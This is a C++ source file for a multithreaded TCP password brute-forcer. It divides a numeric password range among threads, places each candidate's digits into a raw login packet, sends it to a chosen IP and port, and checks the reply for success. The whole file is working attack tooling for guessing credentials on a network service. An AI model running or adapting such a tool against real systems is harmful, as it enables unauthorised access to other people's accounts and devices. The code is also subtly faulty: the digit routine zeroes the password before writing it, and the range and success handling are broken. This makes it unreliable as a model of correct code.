// tcp_brute.cpp -- tcp_brute class methots

#include <iostream>
#include <iomanip>  // for setw()
#include <cstring>  // for memcpy()
#include <unistd.h> // for usleep()

#include "tcp_brute.hpp"  // tcp_brute class defination
#include "tcp_login.hpp"  // tcp_login class defination
#include "tcp_data.hpp"  //
#include "namespace_terminal.hpp" // namespace terminal



tcp_brute::tcp_brute( bool debug_mode, short int threads_count )
			: debugging(debug_mode), num_threads(threads_count )
{
	
}


void tcp_brute::set_password_range( unsigned long int start,
									unsigned long int end )
{
	passwd_range_start = start;
	passwd_range_end = end;
}


void tcp_brute::set_target_address( const char * ip, short int port )
{
	ip_address = ip;
	port_number = port;
}


tcp_brute::~tcp_brute()
{
	sleep(26);
	std::ostringstream stringStream;
	stringStream << terminal::TEXT_BOLD << terminal::TEXTCOLOR_MAGENDA
				<< " +++ ALL DONE +++ " 
				<< terminal::RESET_ALL << std::endl;
	std::cout << stringStream.str();
}


void tcp_brute::init_thread_args()
{
	unsigned long int segment = passwd_range_start;

	for ( int i = 0; i < num_threads; ++i )
	{
		{
			thread_data_t data;

			data.thread_id = i;
			data.pw_range_start = segment;
			segment += (passwd_range_end - passwd_range_start)/num_threads;
			if( i == num_threads )
			{
				data.pw_range_end = passwd_range_end;
			}
			else
			{
				data.pw_range_end = segment;
			}
			++segment;
			
			t_data.push_back(data);
		}
	}
}


void tcp_brute::create_threads()
{

	// initialize thread arguments array
	init_thread_args();


	for (int i = 0; i < num_threads; ++i)
	{
		v_thread.push_back( std::thread( &tcp_brute::bruteforce_thread, this, t_data[i] ) );
		v_thread[i].detach();
	}
}




void tcp_brute::bruteforce_thread( const thread_data_t &t_data )
{
	short int threadID = t_data.thread_id;

	std::ostringstream strStream;
	strStream << "Thread " << threadID << " is strarting" << std::endl;
	std::cout << strStream.str() << std::flush;

//	usleep(100000);
	
	unsigned long int count_loop = 0;
	
	for ( unsigned long int pw = t_data.pw_range_start; pw <= t_data.pw_range_end; ++pw )
	{
		// cout thread loop for debuginng purpose
//		mutex_thread_iter.lock();
//		std::cout << "Loop " << count_loop << " from thread " << threadID << " is strarting" << std::endl;
//		mutex_thread_iter.unlock();
		
		++count_loop;

		/**********************************************************************
		* initialize login_data with login_data_NULL
		* then set current pw
		**********************************************************************/
		char_vect login_data( login_data_NULL,
							  login_data_NULL + sizeof(login_data_NULL)/sizeof(login_data_NULL[0]) );
		repl_hex_data( login_data, pw );
		
		// print current login_data for debugging purpose
		//print_hex_data( login_data, login_data_size );
		
		
		try
		{
			tcp_login login( ip_address, port_number, debugging );
			
			login.receive_from( first_resv_size );
			login.send_to( login_data );
			login.receive_from( second_resv_size );
			login.login_result( failure_reply, success_reply );
			
		}catch( std::pair<unsigned char, std::string> tcp_login_exept )
		{
		// catch block
			if( debugging ){
				//std::cout << "debug mode is true" << std::endl;
				thread_debug( tcp_login_exept.second, threadID, pw );
			}
			
			if ( (tcp_login_exept.first & STATE_FLAGS::NOT_MATCH)
													== STATE_FLAGS::NOT_MATCH )
			{
				// password not match, no errors :(
				continue;
			} else if ( (tcp_login_exept.first & STATE_FLAGS::ERR_CORE)
													== STATE_FLAGS::ERR_CORE )
			{
				// TODO determine failure reason and runtime fix
				continue;
			} else if ( (tcp_login_exept.first & STATE_FLAGS::NOT_RECOGN)
												== STATE_FLAGS::NOT_RECOGN )
			{
				// TODO determine failure reason and runtime fix
				continue;
			} else if ( (tcp_login_exept.first & STATE_FLAGS::PASS_FOUND)
												== STATE_FLAGS::PASS_FOUND )
			{
				// password found!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
//				std::exit( pw );
			}
		}// end chatch block

	} // end for loop
	
}


void tcp_brute::repl_hex_data ( char_vect& hex_data, unsigned long int password )
{
	int count = 0;
	while ( password /= 10 ){
		++count;
	}
	
	for ( int i = count; i >= 0; --i ) {
		/**************************************************************
		* password digits are assigned to the hex_data as hexdecimal
		* represented chars from 58th byte
		* From ASCII table: 0x30 + digit (hexdecimal) <=> digit (char)
		**************************************************************/
		hex_data[58+i] = 0x30 + password % 10;
		password /= 10;
	}
}


void tcp_brute::print_hex_data( char_vect& hex_data )
{
	std::cout << terminal::TEXT_BOLD << terminal::TEXTCOLOR_GREEN;
	
	// Print the login raw data array byte by byte
	for( auto& element : hex_data ) {
		if ( element == 0x00 ) {
			// insted of NULL bytes print "."
			std::cout << ".";
		} else {
			std::cout << element;
		}
	}
	
	std::cout << terminal::RESET_ALL << std::endl;
}


void tcp_brute::thread_debug( std::string& FCN_msg, int thread_ID,
							  unsigned long int passwd )
{
	std::ostringstream stringStream;
	
	stringStream << "TID ";
	stringStream << terminal::TEXT_BOLD << terminal::TEXTCOLOR_YELLOW;
	stringStream << std::left << std::setw(3) << thread_ID;
	stringStream << terminal::RESET_ALL;
	stringStream << "PW ";
	stringStream << terminal::TEXT_BOLD << terminal::TEXTCOLOR_YELLOW;
	stringStream << std::left << std::setw(8) << passwd;
	stringStream << terminal::RESET_ALL;
	
	stringStream << FCN_msg;
	stringStream << std::endl;
	
	std::cout << stringStream.str() << std::flush;
}

